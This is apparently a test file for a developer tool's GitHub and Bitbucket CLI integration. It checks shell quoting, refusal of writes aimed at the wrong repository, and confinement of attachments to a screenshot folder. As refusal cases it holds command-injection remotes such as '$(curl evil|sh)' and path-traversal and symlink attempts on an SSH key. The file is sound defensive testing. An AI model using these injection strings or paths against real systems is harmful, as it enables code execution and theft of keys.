  test('no attach below gh 2.99.0, nor on an Enterprise Server', async () => {
    const fake = fakeForge([
      ...ghReady('github.com', '2.98.1'),
      ...ghReady('git.acme.test', '2.98.1'),
    ])
    const [old, server] = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          yield* port.setForced(projectId, repository('ghes'), 'github', 'git.acme.test')
          return yield* Effect.all([
            port.capabilities(repository('shop')),
            port.capabilities(repository('ghes')),
          ])
        }),
      { shop: REMOTES.shop, ghes: 'https://git.acme.test/acme/ghes.git' },
    )
    expect(old.attachImage).toBe(false)
    expect(server.attachImage).toBe(false)
    expect(server.runWorkflow).toBe(true)
  })

  test('Bitbucket Data Center reads build statuses only', async () => {
    const fake = fakeForge(bktReady([{ base: 'https://git.acme.test:7990', kind: 'dc' }]))
    const capabilities = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          yield* port.setForced(
            projectId,
            repository('dc'),
            'bitbucket-datacenter',
            'git.acme.test',
          )
          return yield* port.capabilities(repository('dc'))
        }),
      { dc: 'ssh://git@git.acme.test:7999/proj/dc.git' },
    )
    expect(capabilities).toEqual({
      runWorkflow: false,
      rerun: false,
      approveManualStep: false,
      attachImage: false,
      readBuildStatuses: true,
      cliVersion: '0.26.0',
    })
  })
})

describe('Forcing a forge is stored and told', () => {
  test('forge.forced and forge.cli_state_changed are written, and the forcing survives a restart', async () => {
    const fake = fakeForge(bktReady([{ base: 'https://git.acme.test:7990', kind: 'dc' }]))
    const main = checkout({ dc: 'ssh://git@git.acme.test:7999/proj/dc.git' })
    const engine = commandsEngine(data, { forge: { env: fake.env } })
    const { projectId, repositoryId, types } = await engine(({ profile }) =>
      profile.use(
        Effect.gen(function* () {
          const project = yield* createProject({
            name: 'Atlas',
            mainCheckout: main,
            repositories: ['dc'],
          })
          const only = project.repositories[0]?.id ?? ''
          const port = yield* forge
          yield* port.checkAgain(project.id, null)
          yield* port.setForced(project.id, only, 'bitbucket-datacenter', 'git.acme.test')
          const { events } = yield* readEvents({})
          return {
            projectId: project.id,
            repositoryId: only,
            types: events
              .filter((event) => event.type.startsWith('forge.'))
              .map((event) => event.type),
          }
        }),
      ),
    )
    expect(types).toEqual(['forge.cli_state_changed', 'forge.forced', 'forge.cli_state_changed'])
    const [after] = await engine(({ profile }) =>
      profile.use(Effect.flatMap(forge, (port) => port.status(projectId))),
    )
    expect(after).toMatchObject({
      repositoryId,
      forge: 'bitbucket-datacenter',
      forced: true,
      state: 'ready',
    })
  })

  test('forge.changes tells the Project’s states after a forcing', async () => {
    const fake = fakeForge(ghReady())
    const told = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          yield* port.checkAgain(projectId, null)
          const following = yield* Effect.forkChild(
            port.changes(projectId).pipe(Stream.take(2), Stream.runCollect),
          )
          yield* Effect.sleep('100 millis')
          yield* port.setForced(projectId, repository('shop'), 'none', null)
          return yield* Fiber.join(following)
        }),
      { shop: REMOTES.shop },
    )
    expect(told.map((states) => states.map((one) => [one.forge, one.state]))).toEqual([
      [['github', 'ready']],
      [['none', 'not-needed']],
    ])
  })

  test('Data Center forced without a host is refused', async () => {
    const fake = fakeForge([], [])
    const refused = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.flip(
          Effect.flatMap(forge, (port) =>
            port.setForced(projectId, repository('shop'), 'bitbucket-datacenter', null),
          ),
        ),
      { shop: 'https://git.acme.test/scm/proj/shop.git' },
    )
    expect(refused).toBeInstanceOf(ForgeRefused)
  })
})

describe('A bkt write goes to the context of the repository’s host, never to the active one', () => {
  const DC = 'https://git.acme.test:7990'
  const TWO = { api: REMOTES.api, dc: 'ssh://git@git.acme.test:7999/proj/dc.git' }
  /** A pull request created through the port, with the place the target names. */
  const create = (repositoryId: string) =>
    Effect.flatMap(forge, (port) =>
      port.operate(repositoryId, (target, run) =>
        run([
          'pr',
          'create',
          ...target.place,
          '--source',
          'feat/x',
          '--target',
          'main',
          '--title',
          'X',
        ]),
      ),
    )

  test('Cloud and Data Center configured, Cloud active: the Data Center write names its own context', async () => {
    const fake = fakeForge(bktReady([BKT_CLOUD, { base: DC, kind: 'dc' }]))
    await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          yield* port.setForced(
            projectId,
            repository('dc'),
            'bitbucket-datacenter',
            'git.acme.test',
          )
          yield* create(repository('dc'))
          yield* create(repository('api'))
        }),
      TWO,
    )
    const writes = fake.calls().filter((call) => call.args[0] === 'pr')
    expect(writes.map((call) => call.args.slice(2, 8))).toEqual([
      ['--context', 'work', '--project', 'PROJ', '--repo', 'dc'],
      ['--context', 'oss', '--workspace', 'acme-team', '--repo', 'api'],
    ])
  })

  test.each([
    ['no context was ever made', []],
    [
      'the only context is another host’s',
      [{ name: 'work', host: 'git.acme.test:7990', active: true }],
    ],
  ])('a host signed in but %s: not ready, with the context to create', async (_case, contexts) => {
    const fake = fakeForge(bktReady([BKT_CLOUD, { base: DC, kind: 'dc' }], contexts))
    const statuses = await withForge(
      fake,
      ({ projectId }) => Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
      { api: REMOTES.api },
    )
    expect(byPath(statuses)['api']).toMatchObject({
      state: 'signed-out',
      fix: `bkt context create ${q('acme-team-bitbucket.org')} --host api.bitbucket.org --workspace ${q('acme-team')}`,
    })
  })

  test('a Data Center host without its context gives the project to create it with', async () => {
    const fake = fakeForge(bktReady([{ base: DC, kind: 'dc' }], []))
    const statuses = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.flatMap(forge, (port) =>
          port.setForced(projectId, repository('dc'), 'bitbucket-datacenter', 'git.acme.test'),
        ),
      { dc: TWO.dc },
    )
    expect(byPath(statuses)['dc']).toMatchObject({
      state: 'signed-out',
      fix: `bkt context create ${q('proj-git.acme.test')} --host git.acme.test:7990 --project ${q('PROJ')}`,
    })
  })

  test('a Data Center personal project is quoted: a shell would expand its tilde', async () => {
    const fake = fakeForge(bktReady([{ base: DC, kind: 'dc' }], []))
    const statuses = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.flatMap(forge, (port) =>
          port.setForced(projectId, repository('dc'), 'bitbucket-datacenter', 'git.acme.test'),
        ),
      { dc: 'ssh://git@git.acme.test:7999/~kris/r.git' },
    )
    expect(byPath(statuses)['dc']).toMatchObject({
      state: 'signed-out',
      fix: `bkt context create ${q('~kris-git.acme.test')} --host git.acme.test:7990 --project ${q('~KRIS')}`,
    })
  })

  test.each([
    ['a command substitution', 'git@bitbucket.org:$(curl evil|sh)/api.git'],
    ['a newline', 'https://bitbucket.org/a%0Acurl%20evil%7Csh%0A/api.git'],
    ['a pipe', 'git@bitbucket.org:a|sh/api.git'],
  ])('an owner holding %s is left out of the line to copy', async (_case, remote) => {
    const fake = fakeForge(bktReady([BKT_CLOUD], []))
    const statuses = await withForge(
      fake,
      ({ projectId }) => Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
      { api: remote },
    )
    expect(byPath(statuses)['api']).toMatchObject({
      state: 'signed-out',
      fix: `bkt context create ${q('bitbucket.org')} --host api.bitbucket.org`,
    })
  })

  test.each([
    ['a space', 'my work'],
    ['a parenthesis', 'work(dc)'],
  ])(
    'a context whose name holds %s is left out: the repository is signed out',
    async (_case, name) => {
      const fake = fakeForge(
        bktReady([BKT_CLOUD], [{ name, host: 'api.bitbucket.org', active: true }]),
      )
      const statuses = await withForge(
        fake,
        ({ projectId }) => Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
        { api: REMOTES.api },
      )
      expect(byPath(statuses)['api']).toMatchObject({
        state: 'signed-out',
        fix: `bkt context create ${q('acme-team-bitbucket.org')} --host api.bitbucket.org --workspace ${q('acme-team')}`,
      })
    },
  )

  test('a host key bkt prints with a shell character gives no line to copy', async () => {
    const fake = fakeForge([
      { cli: 'bkt', when: ['--version'], stdout: 'bkt version 0.26.0\n' },
      {
        cli: 'bkt',
        when: ['auth', 'status'],
        stdout: JSON.stringify({
          hosts: [{ key: 'api.bitbucket.org;sh', base_url: BKT_CLOUD.base, username: 'octo' }],
          contexts: null,
        }),
      },
    ])
    const statuses = await withForge(
      fake,
      ({ projectId }) => Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
      { api: REMOTES.api },
    )
    expect(byPath(statuses)['api']).toMatchObject({ state: 'signed-out', fix: null })
  })
})

describe('A gh write names its repository with its host', () => {
  test('the target places a GitHub Enterprise repository on its own host', async () => {
    const fake = fakeForge([
      ...ghReady('git.acme.test'),
      { cli: 'gh', when: ['pr', 'merge'], stdout: 'merged\n' },
    ])
    await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          yield* port.setForced(projectId, repository('shop'), 'github', 'git.acme.test')
          yield* port.operate(repository('shop'), (target, run) =>
            run(['pr', 'merge', '7', ...target.place, '--squash']),
          )
        }),
      { shop: 'https://git.acme.test/acme/shop.git' },
    )
    const merge = fake.calls().find((call) => call.args[0] === 'pr')
    expect(merge?.args).toEqual([
      'pr',
      'merge',
      '7',
      '--repo',
      'git.acme.test/acme/shop',
      '--squash',
    ])
  })

  test('a write for an Enterprise host naming github.com is refused before spawning', async () => {
    const fake = fakeForge(ghReady('git.acme.test'))
    const refused = await withForge(
      fake,
      ({ projectId }) =>
        Effect.flip(
          Effect.flatMap(runner, (forgeRunner) =>
            forgeRunner.run({
              cli: 'gh',
              forge: 'github',
              host: 'git.acme.test',
              projectId,
              args: ['pr', 'merge', '7', '--repo', 'github.com/acme/shop', '--squash'],
            }),
          ),
        ),
      { shop: REMOTES.shop },
    )
    expect(refused).toBeInstanceOf(ForgeCommandRefused)
    expect(fake.calls()).toEqual([])
  })
})

describe('A repository whose remote names no repository on its forge', () => {
  const forcedGitHub = <A, E>(
    fake: ReturnType<typeof fakeForge>,
    then: (repositoryId: string) => Effect.Effect<A, E, EngineServices>,
  ) =>
    withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          yield* port.setForced(projectId, repository('shop'), 'github', null)
          return yield* then(repository('shop'))
        }),
      { shop: join(work, 'elsewhere') },
    )

  test('its account is still read: gh api --hostname github.com user', async () => {
    const fake = fakeForge(ghReady())
    const login = await forcedGitHub(fake, (repositoryId) =>
      Effect.flatMap(forge, (port) => port.currentUser(repositoryId)),
    )
    expect(login).toBe('octo')
  })

  test('a write on it is refused before spawning: it cannot name the repository', async () => {
    const fake = fakeForge(ghReady())
    const refused = await forcedGitHub(fake, (repositoryId) =>
      Effect.flip(
        Effect.flatMap(forge, (port) =>
          port.operate(repositoryId, (target, run) =>
            run(['pr', 'merge', '7', ...target.place, '--squash']),
          ),
        ),
      ),
    )
    expect(refused).toBeInstanceOf(ForgeRefused)
    expect(fake.calls().filter((call) => call.args[0] === 'pr')).toEqual([])
  })
})

describe('A repository its remote names with what a shape would refuse', () => {
  const write = (
    repositoryId: string,
    args: (place: ReadonlyArray<string>) => ReadonlyArray<string>,
  ) =>
    Effect.flip(
      Effect.flatMap(forge, (port) =>
        port.operate(repositoryId, (target, run) => run(args(target.place))),
      ),
    )

  test('a bkt owner that is no plain word: the write is refused, not a defect', async () => {
    const fake = fakeForge(
      bktReady([BKT_CLOUD], [{ name: 'oss', host: 'api.bitbucket.org', active: true }]),
    )
    const refused = await withForge(
      fake,
      ({ repository }) =>
        write(repository('api'), (place) => [
          'pr',
          'create',
          ...place,
          '--source',
          'feat/x',
          '--target',
          'main',
          '--title',
          'X',
        ]),
      { api: 'git@bitbucket.org:$(x)/r.git' },
    )
    expect(refused).toBeInstanceOf(ForgeRefused)
    expect(fake.calls().filter((call) => call.args[0] === 'pr')).toEqual([])
  })

  test.each([
    ['a space', 'https://github.com/ac me/shop.git'],
    ['a percent-encoded space', 'https://github.com/ac%20me/shop.git'],
  ])('a gh owner holding %s: the write is refused, not a defect', async (_case, remote) => {
    const fake = fakeForge(ghReady())
    const refused = await withForge(
      fake,
      ({ repository }) =>
        write(repository('shop'), (place) => ['pr', 'merge', '7', ...place, '--squash']),
      { shop: remote },
    )
    expect(refused).toBeInstanceOf(ForgeRefused)
    expect(fake.calls().filter((call) => call.args[0] === 'pr')).toEqual([])
  })
})

describe('Waiters wake on a change of state, not of its detail', () => {
  test('two waiters on an unreachable forge whose message changes each check: a bounded number of checks', async () => {
    const fake = fakeForge([
      { cli: 'gh', when: ['--version'], stdout: 'gh version 2.100.0 (2026-09-30)\n' },
      {
        cli: 'gh',
        when: ['auth', 'status'],
        stderr: 'error connecting to api.github.com (attempt {call})\n',
        code: 1,
      },
    ])
    await withForge(
      fake,
      ({ repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          const first = yield* Effect.forkChild(port.currentUser(repository('shop')))
          const second = yield* Effect.forkChild(port.currentUser(repository('shop')))
          yield* Effect.sleep('2 seconds')
          expect(first.pollUnsafe()).toBeUndefined()
          expect(second.pollUnsafe()).toBeUndefined()
          yield* Fiber.interruptAll([first, second])
        }),
      { shop: REMOTES.shop },
    )
    const checks = fake.calls().filter((call) => call.args[0] === 'auth').length
    expect(checks).toBeLessThanOrEqual(4)
  })

  test('a waiter on a forge whose state flips each check is not woken by its own check', async () => {
    const fake = fakeForge([
      { cli: 'gh', when: ['--version'], stdout: 'gh version 2.100.0 (2026-09-30)\n' },
      {
        cli: 'gh',
        when: ['auth', 'status'],
        alternate: [
          'You are not logged into any GitHub hosts.\n',
          'error connecting to api.github.com\n',
        ],
        code: 1,
      },
    ])
    await withForge(
      fake,
      ({ repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          const waiter = yield* Effect.forkChild(port.currentUser(repository('shop')))
          yield* Effect.sleep('2 seconds')
          expect(waiter.pollUnsafe()).toBeUndefined()
          yield* Fiber.interrupt(waiter)
        }),
      { shop: REMOTES.shop },
    )
    const checks = fake.calls().filter((call) => call.args[0] === 'auth').length
    expect(checks).toBeLessThanOrEqual(2)
  })
})

describe('A bkt repository name the shapes would refuse gives no place', () => {
  test.each([
    ['a query in its slug', 'https://bitbucket.org/acme-team/sh%3Fop.git'],
    ['.. for its slug', 'git@bitbucket.org:acme-team/...git'],
    ['.. for its workspace', 'git@bitbucket.org:../api.git'],
  ])('%s: the write is refused before spawning', async (_case, remote) => {
    const fake = fakeForge(bktReady())
    const refused = await withForge(
      fake,
      ({ repository }) =>
        Effect.flip(
          Effect.flatMap(forge, (port) =>
            port.operate(repository('api'), (target, run) =>
              run([
                'pr',
                'create',
                ...target.place,
                '--source',
                'feat/x',
                '--target',
                'main',
                '--title',
                'X',
              ]),
            ),
          ),
        ),
      { api: remote },
    )
    expect(refused).toBeInstanceOf(ForgeRefused)
    expect(fake.calls().filter((call) => call.args[0] === 'pr')).toEqual([])
  })
})

describe('Two waiters on a forge whose state flips each check', () => {
  test('they do not wake each other: a bounded number of checks', async () => {
    const fake = fakeForge([
      { cli: 'gh', when: ['--version'], stdout: 'gh version 2.100.0 (2026-09-30)\n' },
      {
        cli: 'gh',
        when: ['auth', 'status'],
        alternate: [
          'You are not logged into any GitHub hosts.\n',
          'error connecting to api.github.com\n',
        ],
        code: 1,
      },
    ])
    await withForge(
      fake,
      ({ repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          const first = yield* Effect.forkChild(port.currentUser(repository('shop')))
          const second = yield* Effect.forkChild(port.currentUser(repository('shop')))
          yield* Effect.sleep('2 seconds')
          expect(first.pollUnsafe()).toBeUndefined()
          expect(second.pollUnsafe()).toBeUndefined()
          yield* Fiber.interruptAll([first, second])
        }),
      { shop: REMOTES.shop },
    )
    const checks = fake.calls().filter((call) => call.args[0] === 'auth').length
    expect(checks).toBeLessThanOrEqual(4)
  })
})

describe('An image is attached from Hemera’s own screenshot folder only', () => {
  const attach = (path: string) =>
    Effect.flip(
      Effect.flatMap(runner, (forgeRunner) =>
        forgeRunner.run({
          cli: 'gh',
          forge: 'github',
          host: 'github.com',
          projectId: 'p',
          args: ['pr', 'edit', '7', '--repo', 'github.com/acme/shop', '--attach', path],
        }),
      ),
    )
  const ATTACH_OK = { cli: 'gh', when: ['pr', 'edit'], stdout: 'attached\n' } as const

  test('a screenshot of Hemera’s is attached', async () => {
    const fake = fakeForge([...ghReady(), ATTACH_OK])
    await withForge(
      fake,
      () =>
        Effect.gen(function* () {
          const folder = join(data, 'screenshots')
          mkdirSync(folder, { recursive: true })
          writeFileSync(join(folder, 'shot.png'), 'png')
          const forgeRunner = yield* ForgeRunner
          return yield* forgeRunner.run({
            cli: 'gh',
            forge: 'github',
            host: 'github.com',
            projectId: 'p',
            args: [
              'pr',
              'edit',
              '7',
              '--repo',
              'github.com/acme/shop',
              '--attach',
              `${join(folder, 'shot.png')}#The list`,
            ],
          })
        }),
      { shop: REMOTES.shop },
    )
    expect(fake.calls().filter((call) => call.args[0] === 'pr')).toHaveLength(1)
  })

  test.each([
    ['a file elsewhere', () => join(work, 'id_ed25519')],
    ['a path walking out of the folder', () => join(data, 'screenshots', '..', 'hemera.db')],
    ['a relative path', () => 'shot.png'],
    ['a screenshot that does not exist', () => join(data, 'screenshots', 'none.png')],
  ])('%s is refused before spawning', async (_case, path) => {
    const fake = fakeForge([...ghReady(), ATTACH_OK])
    const refused = await withForge(
      fake,
      () =>
        Effect.gen(function* () {
          writeFileSync(join(work, 'id_ed25519'), 'secret')
          mkdirSync(join(data, 'screenshots'), { recursive: true })
          return yield* attach(path())
        }),
      { shop: REMOTES.shop },
    )
    expect(refused).toBeInstanceOf(ForgeCommandRefused)
    expect(fake.calls().filter((call) => call.args[0] === 'pr')).toEqual([])
  })

  test.each([
    [
      'two # with a .. after the first',
      () => `${join(data, 'screenshots', 'shot.png')}#x${sep}..${sep}..${sep}id_ed25519#alt`,
    ],
    [
      'a .. segment that comes back inside the folder',
      () => [data, 'screenshots', '..', 'screenshots', 'shot.png'].join(sep),
    ],
    ['a network path', () => String.raw`\\host\share\shot.png`],
  ])('%s is refused before spawning, the screenshot there', async (_case, path) => {
    const fake = fakeForge([...ghReady(), ATTACH_OK])
    const refused = await withForge(
      fake,
      () =>
        Effect.gen(function* () {
          writeFileSync(join(work, 'id_ed25519'), 'secret')
          mkdirSync(join(data, 'screenshots'), { recursive: true })
          writeFileSync(join(data, 'screenshots', 'shot.png'), 'png')
          return yield* attach(path())
        }),
      { shop: REMOTES.shop },
    )
    expect(refused).toBeInstanceOf(ForgeCommandRefused)
    expect(fake.calls().filter((call) => call.args[0] === 'pr')).toEqual([])
  })

  test.skipIf(process.platform === 'win32')(
    'gh is given the real path that was checked, not the one asked',
    async () => {
      const fake = fakeForge([...ghReady(), ATTACH_OK])
      const folder = join(data, 'screenshots')
      await withForge(
        fake,
        () =>
          Effect.gen(function* () {
            mkdirSync(folder, { recursive: true })
            writeFileSync(join(folder, 'shot.png'), 'png')
            symlinkSync(join(folder, 'shot.png'), join(folder, 'link.png'))
            const forgeRunner = yield* ForgeRunner
            return yield* forgeRunner.run({
              cli: 'gh',
              forge: 'github',
              host: 'github.com',
              projectId: 'p',
              args: [
                'pr',
                'edit',
                '7',
                '--repo',
                'github.com/acme/shop',
                '--attach',
                `${join(folder, 'link.png')}#The list`,
              ],
            })
          }),
        { shop: REMOTES.shop },
      )
      const edit = fake.calls().find((call) => call.args[0] === 'pr')
      expect(edit?.args.at(-1)).toBe(`${realpathSync.native(join(folder, 'shot.png'))}#The list`)
    },
  )

  test.skipIf(process.platform === 'win32')(
    'a link in the folder to a file elsewhere is refused before spawning',
    async () => {
      const fake = fakeForge([...ghReady(), ATTACH_OK])
      const refused = await withForge(
        fake,
        () =>
          Effect.gen(function* () {
            writeFileSync(join(work, 'id_ed25519'), 'secret')
            const folder = join(data, 'screenshots')
            mkdirSync(folder, { recursive: true })
            symlinkSync(join(work, 'id_ed25519'), join(folder, 'shot.png'))
            return yield* attach(join(folder, 'shot.png'))
          }),
        { shop: REMOTES.shop },
      )
      expect(refused).toBeInstanceOf(ForgeCommandRefused)
      expect(fake.calls().filter((call) => call.args[0] === 'pr')).toEqual([])
    },
  )
})

describe('The line to copy is quoted for the shell of the platform', () => {
  test.each([
    [
      'linux',
      "bkt context create '~kris-git.acme.test' --host git.acme.test:7990 --project '~KRIS'",
    ],
    [
      'darwin',
      "bkt context create '~kris-git.acme.test' --host git.acme.test:7990 --project '~KRIS'",
    ],
    [
      'win32',
      'bkt context create "~kris-git.acme.test" --host git.acme.test:7990 --project "~KRIS"',
    ],
  ] as const)('on %s', (platform, line) => {
    expect(
      contextLine('bitbucket-datacenter', 'git.acme.test', 'git.acme.test:7990', '~kris', platform),
    ).toBe(line)
  })
})

describe('A write goes only where its target names', () => {
  test('a gh write naming another repository of the same host is refused before spawning', async () => {
    const fake = fakeForge([...ghReady(), { cli: 'gh', when: ['pr', 'merge'], stdout: 'merged\n' }])
    const refused = await withForge(
      fake,
      ({ repository }) =>
        Effect.flip(
          Effect.flatMap(forge, (port) =>
            port.operate(repository('shop'), (_target, run) =>
              run(['pr', 'merge', '7', '--repo', 'github.com/acme/other', '--squash']),
            ),
          ),
        ),
      { shop: REMOTES.shop },
    )
    expect(refused).toBeInstanceOf(ForgeRefused)
    expect(fake.calls().filter((call) => call.args[0] === 'pr')).toEqual([])
  })

  test('a bkt write naming another workspace is refused before spawning', async () => {
    const fake = fakeForge(bktReady())
    const refused = await withForge(
      fake,
      ({ repository }) =>
        Effect.flip(
          Effect.flatMap(forge, (port) =>
            port.operate(repository('api'), (_target, run) =>
              run([
                'pr',
                'create',
                '--context',
                'oss',
                '--workspace',
                'other-team',
                '--repo',
                'api',
                '--source',
                'feat/x',
                '--target',
                'main',
                '--title',
                'X',
              ]),
            ),
          ),
        ),
      { api: REMOTES.api },
    )
    expect(refused).toBeInstanceOf(ForgeRefused)
    expect(fake.calls().filter((call) => call.args[0] === 'pr')).toEqual([])
  })

  test.each([
    ['another context than its call’s', 'work'],
    ['a context, its call none', null],
  ])('the runner refuses a bkt write through %s', async (_case, context) => {
    const fake = fakeForge(bktReady())
    const refused = await withForge(
      fake,
      ({ projectId }) =>
        Effect.flip(
          Effect.flatMap(runner, (forgeRunner) =>
            forgeRunner.run({
              cli: 'bkt',
              forge: 'bitbucket-cloud',
              host: 'bitbucket.org',
              projectId,
              context,
              args: [
                'pr',
                'create',
                '--context',
                'oss',
                '--workspace',
                'acme-team',
                '--repo',
                'api',
                '--source',
                'feat/x',
                '--target',
                'main',
                '--title',
                'X',
              ],
            }),
          ),
        ),
      { api: REMOTES.api },
    )
    expect(refused).toBeInstanceOf(ForgeCommandRefused)
    expect(fake.calls()).toEqual([])
  })
})
